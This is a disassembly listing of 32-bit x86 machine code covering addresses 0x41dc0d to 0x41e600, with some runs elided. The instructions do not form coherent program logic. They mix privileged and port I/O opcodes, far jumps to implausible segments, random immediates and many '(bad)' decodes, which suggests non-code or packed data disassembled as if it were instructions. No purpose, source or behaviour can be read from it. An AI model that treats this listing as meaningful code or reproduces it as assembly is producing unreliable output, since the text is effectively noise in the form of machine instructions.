  41dc0d:	inc    edx
  41dc0e:	jp     0x41dc2d
	...
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x3ab0d050]
  41dc81:	inc    ebx
  41dc82:	scas   eax,DWORD PTR es:[edi]
  41dc83:	mov    bh,0x80
  41dc85:	cmp    al,0x1
  41dc87:	add    BYTE PTR [ecx+eax*1],al
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	fist   WORD PTR [eax]
  41dc8e:	pushf  
  41dc8f:	dec    eax
  41dc90:	lock push eax
  41dc92:	fiadd  DWORD PTR [ecx+eiz*1]
  41dc95:	or     al,0x35
  41dc97:	fidiv  WORD PTR [esi+0x65]
  41dc9a:	sub    ebx,DWORD PTR [esi-0x45]
  41dc9d:	in     al,0x60
  41dc9f:	or     BYTE PTR [eax-0xb],0x58
  41dca3:	retf   0xacd9
  41dca6:	mov    ch,BYTE PTR [ecx-0x79255bbe]
  41dcac:	fstp   DWORD PTR [ebx-0xcb06d4a]
  41dcb2:	or     eax,0x4d18657c
  41dcb7:	dec    ebx
  41dcb8:	hlt    
  41dcb9:	ret    0x143e
  41dcbc:	(bad)  
  41dcbd:	mov    ebp,0xedba72c6
  41dcc2:	mov    eax,0xf0297a32
  41dcc7:	sti    
  41dcc8:	ins    BYTE PTR es:[edi],dx
  41dcc9:	jne    0x41dd1a
  41dccb:	jmp    0xf977b9e1
  41dcd0:	add    eax,0xed6b594d
  41dcd5:	ins    BYTE PTR es:[edi],dx
  41dcd6:	out    0x7a,al
  41dcd8:	jl     0x41dd4e
  41dcda:	out    dx,al
  41dcdb:	jno    0x41dcac
  41dcdd:	push   0x5b0d26bd
  41dce2:	(bad)  
  41dce3:	dec    ebx
  41dce4:	in     eax,0xe4
  41dce6:	xor    al,0xe8
  41dce8:	pushf  
  41dce9:	jno    0x41dd13
  41dceb:	imul   eax,DWORD PTR [esp+eax*4],0xceeda755
  41dcf2:	add    eax,0x211fd9c5
  41dcf7:	scas   eax,DWORD PTR es:[edi]
  41dcf8:	bswap  esp
  41dcfa:	dec    edi
  41dcfb:	mov    dl,0x5d
  41dcfd:	xlat   BYTE PTR ds:[ebx]
  41dcfe:	shr    DWORD PTR [ebx+ebp*8+0x27],cl
  41dd02:	lds    esi,FWORD PTR [edx]
  41dd04:	dec    esi
  41dd05:	inc    esp
  41dd06:	mov    edx,0x249e8b55
  41dd0b:	pop    esi
  41dd0c:	ret    
  41dd0d:	sub    BYTE PTR [edx-0x1d5c10ff],bl
  41dd13:	test   BYTE PTR [ecx+0x3cedc94f],0xe
  41dd1a:	dec    eax
  41dd1b:	cld    
  41dd1c:	add    al,0xf
  41dd1e:	(bad)  
  41dd1f:	adc    eax,0x57351002
  41dd24:	xor    al,0x63
  41dd26:	sbb    al,0xf3
  41dd28:	outs   dx,DWORD PTR ds:[esi]
  41dd29:	das    
  41dd2a:	ins    BYTE PTR es:[edi],dx
  41dd2b:	(bad)  
  41dd2c:	retf   
  41dd2d:	loopne 0x41dd01
  41dd2f:	mov    edi,0x27cff7e8
  41dd34:	and    ebp,DWORD PTR [eax+0x5d2367c9]
  41dd3a:	fs pop ss
  41dd3c:	call   0x5d32:0x36e8e238
  41dd43:	rcr    ecx,cl
  41dd45:	mov    edi,0xa722db7d
  41dd4a:	cmp    ah,BYTE PTR [ebp+eax*2-0xb088cd3]
  41dd51:	sub    BYTE PTR [edi],bh
  41dd53:	lods   al,BYTE PTR ds:[esi]
  41dd54:	cld    
  41dd55:	cmp    bl,ch
  41dd57:	adc    DWORD PTR [edi+0x77],ecx
  41dd5a:	or     eax,0x4ea32745
  41dd5f:	mov    ebx,0x98f32f9e
  41dd64:	push   ds
  41dd65:	jmp    0x719a:0xa375e2c5
  41dd6c:	sbb    DWORD PTR [ebx+0x4d6e6876],eax
  41dd72:	push   edx
  41dd73:	xor    dh,BYTE PTR [eax-0x1478a016]
  41dd79:	or     dl,BYTE PTR [edx]
  41dd7b:	rol    BYTE PTR [ebp-0x3a83a0b],cl
  41dd81:	mov    ds:0x2e8c2354,al
  41dd86:	jg     0x41dd84
  41dd88:	add    edx,edx
  41dd8a:	mov    edx,ebx
  41dd8c:	and    edx,0x2890
	...
  41ddf2:	add    BYTE PTR [eax],al
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	cmp    DWORD PTR [ebp-0x69],esi
  41de03:	push   0xffffff84
  41de05:	cmp    eax,0x1040001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	adc    BYTE PTR [ebx+0x42454937],ah
  41de12:	jb     0x41de23
  41de14:	push   edi
  41de15:	gs mov dh,0x66
  41de18:	push   esp
  41de19:	aad    0x99
  41de1b:	or     al,ah
  41de1d:	inc    esp
  41de1e:	or     cl,BYTE PTR [ebx]
  41de20:	push   eax
  41de21:	dec    edx
  41de22:	out    dx,eax
  41de23:	loope  0x41de51
  41de25:	iret   
  41de26:	pop    ecx
  41de27:	cli    
  41de28:	lods   al,BYTE PTR ds:[esi]
  41de29:	bound  esi,QWORD PTR [eax-0x957da3f]
  41de2f:	lds    ebx,FWORD PTR [ebx]
  41de31:	gs daa 
  41de33:	push   DWORD PTR [ecx-0x5f1430ca]
  41de39:	adc    eax,DWORD PTR [eax-0x43fd00e4]
  41de3f:	ret    0x57ea
  41de42:	scas   al,BYTE PTR es:[edi]
  41de43:	cmp    BYTE PTR [esi+0xa],0x4c
  41de47:	rol    BYTE PTR [eax-0x20],0x4e
  41de4b:	icebp  
  41de4c:	add    BYTE PTR [eax-0x71],0x6b
  41de50:	push   ss
  41de51:	into   
  41de52:	push   0x495d3dd1
  41de57:	cld    
  41de58:	xlat   BYTE PTR ds:[ebx]
  41de59:	pusha  
  41de5a:	adc    BYTE PTR [eax+0x139fb602],al
  41de60:	xchg   esp,eax
  41de61:	lea    edi,[edx]
  41de63:	jbe    0x41de54
  41de65:	sub    al,0xdf
  41de67:	push   esi
  41de68:	sub    al,0xe6
  41de6a:	and    dh,0x7f
  41de6d:	dec    ebx
  41de6e:	aam    0x51
  41de70:	scas   al,BYTE PTR es:[edi]
  41de71:	outs   dx,BYTE PTR ds:[esi]
  41de72:	retf   
  41de73:	xor    ecx,ebx
  41de75:	sub    edx,DWORD PTR [ebx]
  41de77:	pop    ss
  41de78:	outs   dx,BYTE PTR ds:[esi]
  41de79:	xchg   edx,eax
  41de7a:	sbb    BYTE PTR [edi+0x5e995c7f],0xcf
  41de81:	in     eax,0x41
  41de83:	fdiv   QWORD PTR [edi+0x118db2b7]
  41de89:	mov    ebx,0x6216589f
  41de8e:	int3   
  41de8f:	xor    eax,0x2c2648ce
  41de94:	ja     0x41de30
  41de96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de97:	add    edx,DWORD PTR [ebp-0x6a]
  41de9a:	push   0x1979c42b
  41de9f:	(bad)  
  41dea0:	mov    ch,0xc8
  41dea2:	loop   0x41dee7
  41dea4:	jl     0x41de6a
  41dea6:	inc    edi
  41dea7:	and    al,0x8b
  41dea9:	adc    DWORD PTR [esi+0x6e],0x41
  41dead:	es jns 0x41de5a
  41deb0:	std    
  41deb1:	retf   0x1de0
  41deb4:	mov    ds:0x5716e32a,eax
  41deb9:	jle    0x41de63
  41debb:	retf   0x9c98
  41debe:	cwde   
  41debf:	retf   
  41dec0:	xchg   edx,eax
  41dec1:	imul   edx,DWORD PTR [ecx-0x5d],0xffffffc2
  41dec5:	dec    edx
  41dec6:	push   eax
  41dec7:	pop    es
  41dec8:	jns    0x41ded2
  41deca:	pop    eax
  41decb:	jecxz  0x41debc
  41decd:	out    dx,eax
  41dece:	pop    ebx
  41decf:	xchg   edx,eax
  41ded0:	hlt    
  41ded1:	mov    esp,ecx
  41ded3:	nop
  41ded4:	aaa    
  41ded5:	sbb    al,0x82
  41ded7:	cld    
  41ded8:	xor    al,0x42
  41deda:	out    dx,al
  41dedb:	mov    esp,0x65805e18
  41dee0:	push   ss
  41dee1:	sar    DWORD PTR [eax+0x1c],cl
  41dee4:	test   DWORD PTR [esi+ecx*8],ebx
  41dee7:	shr    BYTE PTR [edi-0x40aa731e],1
  41deed:	xor    ebp,DWORD PTR [ecx+edx*1+0x46]
  41def1:	(bad)  
  41def2:	adc    al,0xca
  41def4:	mov    ah,0x69
  41def6:	inc    ecx
  41def7:	inc    ebx
  41def8:	pop    esp
  41def9:	test   BYTE PTR [eax+eax*1],bl
  41defc:	adc    al,0xe8
  41defe:	and    eax,0x3885f41a
  41df03:	xor    cl,BYTE PTR [edi-0x9621d40]
  41df09:	push   edx
  41df0a:	jno    0x41df5f
  41df0c:	jmp    0x41df0b
  41df0e:	repz dec esp
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xadd19ce9
  41df82:	retw   0x3e88
  41df86:	add    DWORD PTR [eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	mov    edi,0x80a807fd
  41df91:	test   eax,0xf15bf56b
  41df96:	push   0x61
  41df98:	inc    ebx
  41df99:	shr    BYTE PTR [edx-0x1d192e4a],0xa7
  41dfa0:	mov    eax,0x593cf18b
  41dfa5:	pop    ds
  41dfa6:	test   eax,0x5594106c
  41dfab:	mov    gs,WORD PTR ds:0x1954fd04
  41dfb1:	and    BYTE PTR [edi+0x28],bh
  41dfb4:	and    al,0x53
  41dfb6:	mov    eax,ds:0x8ad6da6
  41dfbb:	xchg   esp,eax
  41dfbc:	data16 das 
  41dfbe:	sub    BYTE PTR [esi],0xe7
  41dfc1:	inc    edx
  41dfc2:	mov    ecx,0x3aedda22
  41dfc7:	pushf  
  41dfc8:	or     al,0x6e
  41dfca:	mov    esp,0x31662cea
  41dfcf:	mov    fs,ebp
  41dfd1:	sub    al,0x7b
  41dfd3:	fcos   
  41dfd5:	add    al,0x4d
  41dfd7:	mov    ch,BYTE PTR [ecx-0x57391e4f]
  41dfdd:	test   ebp,edx
  41dfdf:	pop    ss
  41dfe0:	sbb    BYTE PTR [ebp-0x42131a69],dl
  41dfe6:	sar    DWORD PTR [edi+eax*1-0x71c870fb],1
  41dfed:	dec    BYTE PTR [ebp+edi*1+0x6d]
  41dff1:	addr16 cld 
  41dff3:	std    
  41dff4:	shl    BYTE PTR [edx-0x53],cl
  41dff7:	shr    DWORD PTR [ebx-0x1a],0x6a
  41dffb:	jns    0x41e001
  41dffd:	je     0x41df95
  41dfff:	jg     0x41dfe0
  41e001:	mov    ch,0x27
  41e003:	neg    dh
  41e005:	dec    ebx
  41e006:	sub    eax,0xf4854636
  41e00b:	in     eax,0x85
  41e00d:	sbb    esp,DWORD PTR [esi+0x14]
  41e010:	jecxz  0x41dfa4
  41e012:	adc    BYTE PTR [edx+0x5d],0x36
  41e016:	arpl   bx,bx
  41e018:	jge    0x41e005
  41e01a:	daa    
  41e01b:	jmp    0x761725a2
  41e020:	or     bl,BYTE PTR [eax-0x5c]
  41e023:	cmp    DWORD PTR [esi+ecx*8-0x5a],eax
  41e027:	in     eax,0xfe
  41e029:	lock cs push esp
  41e02c:	push   esp
  41e02d:	sbb    edi,eax
  41e02f:	or     ah,BYTE PTR [esi]
  41e031:	call   0xfdc9:0x62c1a138
  41e038:	imul   ebx,DWORD PTR ds:0x29d7b5a5,0xb2de32f4
  41e042:	xchg   esp,eax
  41e043:	aam    0x4b
  41e045:	pusha  
  41e046:	mov    cr4,ebp
  41e049:	inc    edi
  41e04a:	pop    ebp
  41e04b:	shl    BYTE PTR [ebx+eiz*1],0xb7
  41e04f:	mov    eax,0x522d5d4d
  41e054:	dec    ebp
  41e055:	adc    ecx,esi
  41e057:	lea    esi,[esi]
  41e059:	in     eax,dx
  41e05a:	xchg   esi,eax
  41e05b:	jb     0x41e058
  41e05d:	das    
  41e05e:	test   DWORD PTR [edx+0x1eb4c418],ebp
  41e064:	mul    DWORD PTR [ebx-0x7b9e3078]
  41e06a:	pop    edi
  41e06b:	outs   dx,BYTE PTR ds:[esi]
  41e06c:	add    ch,ah
  41e06e:	retf   
  41e06f:	cdq    
  41e070:	es jp  0x41e0f1
  41e073:	pop    esp
  41e074:	inc    ax
  41e076:	xchg   esi,eax
  41e077:	cmp    BYTE PTR [esi],dh
  41e079:	sub    esi,ebp
  41e07b:	enter  0x5927,0x6f
  41e07f:	pop    eax
  41e080:	rol    DWORD PTR [esi],1
  41e082:	mov    ah,0xdf
  41e084:	in     eax,0x7f
  41e086:	pop    ebx
  41e087:	and    BYTE PTR [eax+0x44],dl
  41e08a:	mov    eax,ds:0xa0189c41
  41e08f:	jnp    0x41e091
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	cmp    DWORD PTR [eax+0x6c],0x13f8cc6
  41e107:	add    BYTE PTR [ecx+eax*1],al
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	int3   
  41e10d:	jle    0x41e116
  41e10f:	mov    bl,0x35
  41e111:	cdq    
  41e112:	push   0xffffffd6
  41e114:	jmp    0xe318a80b
  41e119:	popf   
  41e11a:	xchg   ecx,eax
  41e11b:	mov    eax,ds:0xfb9e4be7
  41e120:	test   al,ch
  41e122:	jle    0x41e121
  41e124:	sub    DWORD PTR [edx+0x2],ecx
  41e127:	cmc    
  41e128:	xor    esp,DWORD PTR [ecx]
  41e12a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e12b:	and    al,0x50
  41e12d:	ds mov ebp,esi
  41e130:	xor    eax,0x9dfc0ac9
  41e135:	test   DWORD PTR [edx],0x78806e42
  41e13b:	or     BYTE PTR [ebp+0x25c0c4e4],ah
  41e141:	sti    
  41e142:	jmp    0x9ba7352
  41e147:	pop    ss
  41e148:	mov    WORD PTR [edx+0x8b5b529],ss
  41e14e:	dec    esi
  41e14f:	fdiv   DWORD PTR [esi+0x22]
  41e152:	mov    edi,0x71aa34e3
  41e157:	lods   eax,DWORD PTR ds:[esi]
  41e158:	ficom  DWORD PTR [ebp-0x5c]
  41e15b:	sub    esp,DWORD PTR [ebx-0x3]
  41e15e:	stos   DWORD PTR es:[edi],eax
  41e15f:	bound  edi,QWORD PTR [eax-0x26]
  41e162:	rcl    DWORD PTR [ebx],1
  41e164:	fwait
  41e165:	hlt    
  41e166:	adc    DWORD PTR [ecx-0x59],eax
  41e169:	mov    eax,ds:0x11b52bff
  41e16e:	sbb    ecx,DWORD PTR [ecx]
  41e170:	jb     0x41e127
  41e172:	(bad)  
  41e173:	and    BYTE PTR [edx-0x5516c3f4],dl
  41e179:	cmp    ebx,ecx
  41e17b:	cmp    DWORD PTR [ebx+ebx*1-0x65],ebx
  41e17f:	jmp    0x41e18e
  41e181:	pusha  
  41e182:	hlt    
  41e183:	dec    esi
  41e184:	scas   eax,DWORD PTR es:[edi]
  41e185:	inc    esp
  41e186:	xchg   BYTE PTR [edx+ecx*2],bl
  41e189:	lahf   
  41e18a:	rol    DWORD PTR [esi],1
  41e18c:	mov    esp,0xf04e5423
  41e191:	call   0x3f6dc8ca
  41e196:	xchg   esi,eax
  41e197:	jnp    0x41e13c
  41e199:	add    ebx,esp
  41e19b:	inc    edx
  41e19c:	pop    ecx
  41e19d:	xor    esp,DWORD PTR [ebx]
  41e19f:	pop    ss
  41e1a0:	cmp    DWORD PTR [esi+ebp*8],0xffffffe0
  41e1a4:	dec    ebx
  41e1a5:	std    
  41e1a6:	setns  bh
  41e1a9:	pop    ds
  41e1aa:	mov    ebx,0x16acc7dc
  41e1af:	hlt    
  41e1b0:	inc    ecx
  41e1b1:	or     al,0xf0
  41e1b3:	xchg   DWORD PTR ds:0xed38c900,ebp
  41e1b9:	dec    ebx
  41e1ba:	adc    eax,0xcf66fc5d
  41e1bf:	fs stos DWORD PTR es:[edi],eax
  41e1c1:	add    al,0xd9
  41e1c3:	outs   dx,DWORD PTR ss:[esi]
  41e1c5:	xchg   edx,eax
  41e1c6:	into   
  41e1c7:	mov    dh,BYTE PTR [edi+0x4f]
  41e1ca:	pop    es
  41e1cb:	rcr    ah,1
  41e1cd:	xor    edi,DWORD PTR [ecx+0x7c]
  41e1d0:	icebp  
  41e1d1:	jp     0x41e1ce
  41e1d3:	dec    esp
  41e1d4:	test   ah,ch
  41e1d6:	mov    eax,0x2f20c09b
  41e1db:	or     eax,DWORD PTR [ebx+0x649c8753]
  41e1e1:	nop
  41e1e2:	int    0x20
  41e1e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1e5:	fnsave [edi]
  41e1e7:	push   0xffffffd8
  41e1e9:	fsub   QWORD PTR [ebx+eiz*4+0x71053b40]
  41e1f0:	sub    al,BYTE PTR [esi-0x4a]
  41e1f3:	lea    esp,[edx-0x20]
  41e1f6:	retf   
  41e1f7:	bswap  esi
  41e1f9:	mov    si,0x4f94
  41e1fd:	addr16 adc al,cl
  41e200:	sbb    ebx,DWORD PTR [edi-0x4d]
  41e203:	inc    edx
  41e204:	in     eax,0xf1
  41e206:	jne    0x41e193
  41e208:	(bad)
  41e20b:	loopne 0x41e1d9
  41e20d:	push   eax
  41e20e:	or     BYTE PTR [edi+0x0],dh
	...
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0x53
  41e281:	adc    DWORD PTR [edx+0x49],esi
  41e284:	nop
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	xchg   edx,eax
  41e28d:	lds    ecx,FWORD PTR [eax]
  41e28f:	ss out dx,al
  41e291:	enter  0x2fa2,0x75
  41e295:	popf   
  41e296:	rcl    DWORD PTR [ecx],cl
  41e298:	mov    esp,0x72a3c725
  41e29d:	(bad)  
  41e29e:	mov    cl,0x7e
  41e2a0:	jnp    0x41e292
  41e2a2:	fwait
  41e2a3:	sub    edx,DWORD PTR [ecx-0x345edeae]
  41e2a9:	popa   
  41e2aa:	pushf  
  41e2ab:	outs   dx,DWORD PTR ds:[esi]
  41e2ac:	enter  0x4c78,0x17
  41e2b0:	adc    DWORD PTR [edx-0x71],ebp
  41e2b3:	ja     0x41e2e1
  41e2b5:	xlat   BYTE PTR ds:[ebx]
  41e2b6:	imul   ebx,edi,0x130da43e
  41e2bc:	lea    esp,[ecx]
  41e2be:	cmp    bl,BYTE PTR [eax+eiz*2-0x50]
  41e2c2:	mov    ebp,0xf05aa000
  41e2c7:	and    eax,0x1874331
  41e2cc:	and    ecx,DWORD PTR [ecx+0x33]
  41e2cf:	lock stos BYTE PTR es:[edi],al
  41e2d1:	mov    DWORD PTR [ebx+0x1d],ebp
  41e2d4:	cdq    
  41e2d5:	scas   al,BYTE PTR es:[edi]
  41e2d6:	outs   dx,BYTE PTR ds:[esi]
  41e2d7:	sar    DWORD PTR [edi+0x3b],cl
  41e2da:	lock cmp edi,DWORD PTR [ebp-0x1d]
  41e2de:	adc    eax,DWORD PTR [ebp+edi*2-0x6c]
  41e2e2:	cli    
  41e2e3:	mov    ds:0xf7ded58e,eax
  41e2e8:	cld    
  41e2e9:	add    BYTE PTR [eax-0x2],bh
  41e2ec:	jmp    0x41e36d
  41e2ee:	retf   
  41e2ef:	(bad)  
  41e2f0:	ins    BYTE PTR es:[edi],dx
  41e2f1:	dec    esp
  41e2f2:	and    al,cl
  41e2f4:	stc    
  41e2f5:	in     al,0x71
  41e2f7:	das    
  41e2f8:	fistp  DWORD PTR [ebx+0x78a6df1f]
  41e2fe:	(bad)  
  41e2ff:	cli    
  41e300:	push   0xfa889dea
  41e305:	jno    0x41e32b
  41e307:	std    
  41e308:	(bad)  
  41e309:	(bad)  
  41e30a:	test   al,0x39
  41e30c:	inc    edi
  41e30d:	out    dx,eax
  41e30e:	push   es
  41e30f:	adc    al,0x66
  41e311:	scas   eax,DWORD PTR es:[edi]
  41e312:	test   DWORD PTR [eax],ecx
  41e314:	lock push ds
  41e316:	aam    0x15
  41e318:	sub    ah,al
  41e31a:	xchg   esi,eax
  41e31b:	rol    DWORD PTR [edx-0x54],0x1f
  41e31f:	jbe    0x41e377
  41e321:	(bad)  
  41e322:	xor    cl,BYTE PTR [edi-0x41]
  41e325:	mov    bh,0x29
  41e328:	mov    dh,cl
  41e32a:	in     al,0x50
  41e32c:	jmp    0xabe8:0x2601a852
  41e333:	inc    esi
  41e334:	and    eax,0xf6fd307d
  41e339:	xor    al,0x2a
  41e33b:	lock test ax,0xf490
  41e340:	ror    BYTE PTR [edx],0xe2
  41e343:	pop    edx
  41e344:	inc    ebp
  41e345:	lock mov ah,0x16
  41e348:	ror    BYTE PTR [esi],0xbf
  41e34b:	mov    edx,0x4632296
  41e350:	mov    ecx,0x237c9a39
  41e355:	imul   edi,DWORD PTR ss:[ebx],0x50
  41e359:	fnstcw WORD PTR [esi]
  41e35b:	and    edi,esp
  41e35d:	bound  ebp,QWORD PTR [ebx+0x3df20449]
  41e363:	fsub   DWORD PTR [eax+0x101bc70e]
  41e369:	cmp    ebp,DWORD PTR [edi+0x69]
  41e36c:	sub    BYTE PTR [edi],0x31
  41e36f:	int3   
  41e370:	sbb    al,0x65
  41e372:	push   ecx
  41e373:	enter  0xa3c3,0xa1
  41e377:	pushf  
  41e378:	mul    bh
  41e37a:	mov    esi,0x3066efde
  41e37f:	pop    edx
  41e380:	lahf   
  41e381:	retf   
  41e382:	repnz lds ebp,FWORD PTR [edx+eiz*8-0x5a8896f6]
  41e38a:	loopne 0x41e37d
  41e38c:	ror    BYTE PTR [ebx+0x7a5f],cl
	...
  41e3f2:	add    BYTE PTR [eax],al
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xea32d109
  41e403:	out    0x94,al
  41e405:	inc    ecx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e40d:	mov    edi,esp
  41e40f:	das    
  41e410:	sub    bh,ch
  41e412:	arpl   WORD PTR [esi],si
  41e414:	jg     0x41e41b
  41e416:	xchg   esi,eax
  41e417:	jne    0x41e3f4
  41e419:	xor    DWORD PTR [eax-0x1ab9da8a],0x72
  41e420:	jmp    0x41e494
  41e422:	jb     0x41e3c8
  41e424:	push   edi
  41e425:	pop    ebp
  41e426:	mov    WORD PTR [edx],ds
  41e428:	jbe    0x41e490
  41e42a:	mov    eax,ds:0x5625900a
  41e42f:	cdq    
  41e430:	scas   eax,DWORD PTR es:[edi]
  41e431:	loope  0x41e3ef
  41e433:	enter  0x14e5,0xb9
  41e437:	int3   
  41e438:	hlt    
  41e439:	mov    cl,BYTE PTR es:[ecx]
  41e43c:	mov    bl,0xa2
  41e43e:	mov    ebx,0x8772346c
  41e443:	sub    BYTE PTR [edi],ch
  41e445:	adc    dh,BYTE PTR [esi+0x66]
  41e448:	mov    al,ds:0xd200f047
  41e44d:	jne    0x41e404
  41e44f:	adc    ah,BYTE PTR [edi+0x17f42892]
  41e455:	adc    BYTE PTR [eax],0xb6
  41e458:	(bad)  
  41e459:	push   edx
  41e45a:	push   ecx
  41e45b:	pop    es
  41e45c:	outs   dx,BYTE PTR ds:[esi]
  41e45d:	push   cs
  41e45e:	pusha  
  41e45f:	mov    ds,ebx
  41e461:	lods   eax,DWORD PTR ds:[esi]
  41e462:	xor    al,0x3e
  41e464:	outs   dx,BYTE PTR ds:[esi]
  41e465:	div    DWORD PTR [edx-0x34]
  41e468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e469:	pop    edx
  41e46a:	loope  0x41e41f
  41e46c:	adc    al,BYTE PTR [eax-0x50]
  41e46f:	mov    ah,0x2c
  41e471:	fbld   TBYTE PTR [edx]
  41e473:	sbb    eax,0x35089fb4
  41e478:	and    bh,bh
  41e47a:	nop
  41e47b:	sub    eax,0xd35ce05d
  41e480:	pop    esp
  41e481:	lahf   
  41e482:	or     bh,dh
  41e484:	sbb    al,0x7e
  41e486:	clc    
  41e487:	push   ebx
  41e488:	data16 adc al,BYTE PTR [eax-0x5a]
  41e48c:	fidiv  WORD PTR [esi+0x77f337a6]
  41e492:	int3   
  41e493:	mov    esp,0xc963d994
  41e498:	xor    dl,BYTE PTR [ebp-0x2d9840f5]
  41e49e:	and    ecx,ebx
  41e4a0:	pop    ds
  41e4a1:	add    BYTE PTR [bx+di-0x5c3],cl
  41e4a6:	sbb    BYTE PTR [eax+0x26c2224e],ch
  41e4ac:	jnp    0x41e43d
  41e4ae:	mov    dh,0x2
  41e4b0:	addr16 in al,dx
  41e4b2:	scas   eax,DWORD PTR es:[edi]
  41e4b3:	pop    eax
  41e4b4:	inc    ebp
  41e4b5:	jg     0x41e43a
  41e4b7:	mov    eax,ds:0xc4cca3b0
  41e4bc:	outs   dx,BYTE PTR ds:[esi]
  41e4bd:	jmp    0x7714:0x91f1
  41e4c3:	outs   dx,BYTE PTR ds:[esi]
  41e4c4:	outs   dx,BYTE PTR ds:[esi]
  41e4c5:	mov    DWORD PTR ss:[edx+edi*1],0x13326b4
  41e4cd:	cli    
  41e4ce:	adc    edx,DWORD PTR [ecx-0x3c]
  41e4d1:	mov    dh,0x33
  41e4d3:	daa    
  41e4d4:	enter  0x57c2,0xe9
  41e4d8:	pop    edx
  41e4d9:	mov    ch,BYTE PTR [esi]
  41e4db:	outs   dx,DWORD PTR ds:[esi]
  41e4dc:	cmp    DWORD PTR [edx],ebp
  41e4de:	jbe    0x41e498
  41e4e0:	jns    0x41e4fb
  41e4e2:	nop
  41e4e3:	pop    ebx
  41e4e4:	inc    esi
  41e4e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4e6:	mov    dh,0x95
  41e4e8:	sub    dh,BYTE PTR [edx-0x2a]
  41e4eb:	inc    edx
  41e4ec:	aam    0x61
  41e4ee:	dec    al
  41e4f0:	arpl   WORD PTR gs:[ebx-0x6d],di
  41e4f4:	jmp    0x41e479
  41e4f6:	mov    ch,0xa7
  41e4f8:	aam    0x4d
  41e4fa:	dec    esp
  41e4fb:	outs   dx,BYTE PTR ds:[esi]
  41e4fc:	out    0x37,al
  41e4fe:	inc    edi
  41e4ff:	in     al,0x90
  41e501:	adc    bl,ah
  41e503:	test   eax,0x70c2abc0
  41e508:	popa   
  41e509:	js     0x41e567
  41e50b:	dec    esi
  41e50c:	ins    BYTE PTR es:[edi],dx
  41e50d:	outs   dx,DWORD PTR ds:[esi]
  41e50e:	sub    BYTE PTR [edx+0x0],bh
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e583
  41e581:	mov    dh,0xbe
  41e583:	and    DWORD PTR [eax+0x4000142],ebx
  41e589:	add    DWORD PTR [eax],eax
  41e58b:	add    dl,dh
  41e58d:	rep stos BYTE PTR es:[edi],al
  41e58f:	xchg   esi,eax
  41e590:	xor    DWORD PTR [ecx+eiz*2+0x3c],eax
  41e594:	lahf   
  41e595:	test   DWORD PTR [ebx-0x18],0xa91bc537
  41e59c:	push   cs
  41e59d:	popa   
  41e59e:	sbb    BYTE PTR [ebx],0xe9
  41e5a1:	sbb    dh,BYTE PTR ds:0x14abf275
  41e5a7:	std    
  41e5a8:	(bad)  
  41e5a9:	test   BYTE PTR [edx],0xe6
  41e5ac:	push   esi
  41e5ad:	xchg   ebp,eax
  41e5ae:	dec    ecx
  41e5af:	jp     0x41e60a
  41e5b1:	add    DWORD PTR [esi+ebx*2],esi
  41e5b4:	dec    ebp
  41e5b5:	daa    
  41e5b6:	into   
  41e5b7:	out    dx,eax
  41e5b8:	xor    DWORD PTR [edi],eax
  41e5ba:	adc    eax,0xb031f74f
  41e5bf:	mov    bl,0x62
  41e5c1:	add    al,0xf3
  41e5c3:	xchg   edi,eax
  41e5c4:	fsub   DWORD PTR [edi]
  41e5c6:	not    edi
  41e5c8:	inc    edi
  41e5c9:	jo     0x41e5aa
  41e5cb:	in     eax,0xf1
  41e5cd:	or     BYTE PTR [edi],bh
  41e5cf:	add    eax,0xb9cc8763
  41e5d4:	and    al,0xfe
  41e5d6:	stos   DWORD PTR es:[edi],eax
  41e5d7:	aad    0xf5
  41e5d9:	bound  ecx,QWORD PTR [ecx-0x2]
  41e5dc:	and    eax,DWORD PTR [ebx+eiz*2-0x5915ef73]
  41e5e3:	test   al,0x40
  41e5e5:	cmp    eax,0x938a4f12
  41e5ea:	inc    eax
  41e5eb:	int    0x6f
  41e5ed:	shl    cl,1
  41e5ef:	repz sahf 
  41e5f1:	jg     0x41e63a
  41e5f3:	arpl   WORD PTR [esi+0x2022c41f],dx
  41e5f9:	mov    bl,0x76
  41e5fb:	daa    
  41e5fc:	push   es
  41e5fd:	frstor [edi-0x6]
  41e600:	das    
